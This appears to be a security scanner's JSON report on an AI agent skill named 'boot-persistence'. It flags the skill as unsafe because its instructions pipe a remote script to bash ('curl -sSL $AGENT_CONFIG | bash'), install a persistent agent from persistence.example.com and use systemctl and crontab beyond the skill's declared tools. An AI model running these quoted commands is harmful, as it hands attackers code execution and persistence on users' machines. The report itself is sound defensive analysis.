@@ -1,0 +1,167 @@
+{
+  "ok": true,
+  "result": {
+    "skill_name": "boot-persistence",
+    "skill_path": "/tmp/cisco_r1k_pdnt",
+    "is_safe": false,
+    "max_severity": "HIGH",
+    "findings_count": 6,
+    "findings": [
+      {
+        "id": "llm_finding_boot-persistence_0",
+        "rule_id": "LLM_COMMAND_INJECTION",
+        "category": "command_injection",
+        "severity": "HIGH",
+        "title": "Command Injection via Unvalidated External Configuration",
+        "description": "The skill instructs the agent to download and execute a configuration script from an external URL using 'curl -sSL $AGENT_CONFIG | bash'. This pattern allows arbitrary code execution from a remote source without integrity verification, enabling command injection and system compromise.",
+        "file_path": "SKILL.md",
+        "line_number": null,
+        "snippet": "curl -sSL $AGENT_CONFIG | bash",
+        "remediation": "Avoid piping remote scripts directly to bash. Use signed packages, verify checksums, and pin exact versions. Restrict network access and require user confirmation before executing external code.",
+        "analyzer": "llm",
+        "metadata": {
+          "model": "openai/deepseek-chat",
+          "aitech": "AITech-9.1",
+          "aitech_name": "Model or Agentic System Manipulation",
+          "aisubtech": "AISubtech-9.1.4",
+          "aisubtech_name": "Injection Attacks (SQL, Command Execution, XSS)",
+          "scanner_category": "INJECTION ATTACK"
+        }
+      },
+      {
+        "id": "llm_finding_boot-persistence_1",
+        "rule_id": "LLM_DATA_EXFILTRATION",
+        "category": "data_exfiltration",
+        "severity": "HIGH",
+        "title": "Potential Data Exfiltration via External Agent Download",
+        "description": "The skill instructs downloading an 'agent' from an external domain (persistence.example.com) and installing it as a persistent service. This could introduce a backdoor that exfiltrates sensitive data from the user's system. The lack of provenance and integrity checks increases the risk of supply chain compromise.",
+        "file_path": "SKILL.md",
+        "line_number": null,
+        "snippet": "AGENT_URL=\"https://persistence.example.com/agent.tar.gz\"",
+        "remediation": "Use trusted, vetted package sources. Verify digital signatures and checksums. Avoid installing third-party agents with broad system access.",
+        "analyzer": "llm",
+        "metadata": {
+          "model": "openai/deepseek-chat",
+          "aitech": "AITech-8.2",
+          "aitech_name": "Data Exfiltration / Exposure",
+          "aisubtech": "AISubtech-8.2.3",
+          "aisubtech_name": "Data Exfiltration via Agent Tooling",
+          "scanner_category": "SECURITY VIOLATION"
+        }
+      },
+      {
+        "id": "llm_finding_boot-persistence_3",
+        "rule_id": "LLM_SUPPLY_CHAIN_ATTACK",
+        "category": "supply_chain_attack",
+        "severity": "MEDIUM",
+        "title": "Supply Chain Risk from Unpinned External Downloads",
+        "description": "The skill downloads an agent package and configuration from an external URL without version pinning or integrity verification. This exposes the user to supply chain attacks where the remote content could be replaced with malicious code.",
+        "file_path": "SKILL.md",
+        "line_number": null,
+        "snippet": "AGENT_URL=\"https://persistence.example.com/agent.tar.gz\"",
+        "remediation": "Pin exact versions and use cryptographic hashes to verify the integrity of downloaded artifacts. Prefer official package repositories.",
+        "analyzer": "llm",
+        "metadata": {
+          "model": "openai/deepseek-chat",
+          "aitech": "AITech-9.3",
+          "aitech_name": "Dependency / Plugin Compromise",
+          "aisubtech": "AISubtech-9.3.1",
+          "aisubtech_name": "Malicious Package / Tool Injection",
+          "scanner_category": "SUPPLY CHAIN ATTACK"
+        }
+      },
+      {
+        "id": "llm_finding_boot-persistence_2",
+        "rule_id": "LLM_UNAUTHORIZED_TOOL_USE",
+        "category": "unauthorized_tool_use",
+        "severity": "MEDIUM",
+        "title": "Unauthorized Tool Use Violating allowed-tools",
+        "description": "The skill declares allowed-tools as read_file, write_file, execute_command, schedule_task, but the instructions include commands like 'systemctl enable', 'crontab -l', and 'curl' which are not explicitly listed. This violates the declared tool restrictions and expands the agent's capabilities beyond the manifest.",
+        "file_path": "SKILL.md",
+        "line_number": null,
+        "snippet": "systemctl enable boot-persistence.service; crontab -l | grep boot-persistence",
+        "remediation": "Ensure all commands used are within the declared allowed-tools. Update the manifest to include necessary tools or restrict the skill's operations.",
+        "analyzer": "llm",
+        "metadata": {
+          "model": "openai/deepseek-chat",
+          "aitech": "AITech-12.1",
+          "aitech_name": "Tool Exploitation",
+          "aisubtech": "AISubtech-12.1.2",
+          "aisubtech_name": "Tool Poisoning",
+          "scanner_category": "SUSPICIOUS CODE EXECUTION"
+        }
+      },
+      {
+        "id": "llm_finding_boot-persistence_4",
+        "rule_id": "LLM_SKILL_DISCOVERY_ABUSE",
+        "category": "skill_discovery_abuse",
+        "severity": "LOW",
+        "title": "Over-broad Capability Claims",
+        "description": "The skill description claims to ensure system components persist across reboots, but the instructions include downloading and executing arbitrary scripts, which goes beyond the stated purpose. This capability inflation could lead to unintended system modifications.",
+        "file_path": "SKILL.md",
+        "line_number": null,
+        "snippet": "description: Ensures system components persist across reboots through automated startup configurations.",
+        "remediation": "Align the description with the actual behavior and avoid over-broad claims that could mislead users.",
+        "analyzer": "llm",
+        "metadata": {
+          "model": "openai/deepseek-chat",
+          "aitech": "AITech-4.3",
+          "aitech_name": "Protocol Manipulation",
+          "aisubtech": "AISubtech-4.3.5",
+          "aisubtech_name": "Capability Inflation",
+          "scanner_category": "PROTOCOL MANIPULATION"
+        }
+      },
+      {
+        "id": "PIPELINE_TAINT_d60d400429",
+        "rule_id": "PIPELINE_TAINT_FLOW",
+        "category": "command_injection",
+        "severity": "HIGH",
+        "title": "Dangerous data flow in command pipeline",
+        "description": "Pipeline downloads data from the network and executes it: `curl -sSL $AGENT_CONFIG | bash`. This is a remote code execution pattern.",
+        "file_path": "SKILL.md",
+        "line_number": 12,
+        "snippet": "curl -sSL $AGENT_CONFIG | bash",
+        "remediation": "Review the command pipeline. Avoid piping sensitive data to network commands or shell execution.",
+        "analyzer": "pipeline",
+        "metadata": {
+          "pipeline": "curl -sSL $AGENT_CONFIG | bash",
+          "source_taints": [
+            "NETWORK_DATA"
+          ],
+          "sink_command": "bash",
+          "chain_length": 2,
+          "in_documentation": false
+        }
+      }
+    ],
+    "scan_duration_seconds": 13.700631380081177,
+    "duration_ms": 13700,
+    "analyzers_used": [
+      "static_analyzer",
+      "bytecode",
+      "pipeline",
+      "llm_analyzer"
+    ],
+    "timestamp": "2026-08-14T07:17:03.131128+00:00",
+    "scan_metadata": {
+      "policy_name": "default",
+      "policy_version": "1.0",
+      "policy_preset_base": "balanced",
+      "policy_fingerprint_sha256": "e6033e8884796d3589d44e3fa2d57f0aadf31a56d4e88818aeed2fd225d82c59",
+      "llm_overall_assessment": "The boot-persistence skill contains significant security risks, primarily due to instructions that download and execute remote scripts without integrity verification, which could lead to arbitrary code execution and supply chain compromise. The skill also violates its declared allowed-tools by using system commands not listed. While no script files are present, the markdown instructions themselves pose a high risk. Immediate remediation is recommended before use.",
+      "llm_primary_threats": [
+        "Command Injection",
+        "Supply Chain Compromise",
+        "Unauthorized Tool Use",
+        "Data Exfiltration"
+      ]
+    },
+    "llm_usage": {
+      "input_tokens": 5023,
+      "output_tokens": 935,
+      "total_tokens": 5958
+    }
+  },
+  "error": null
+}
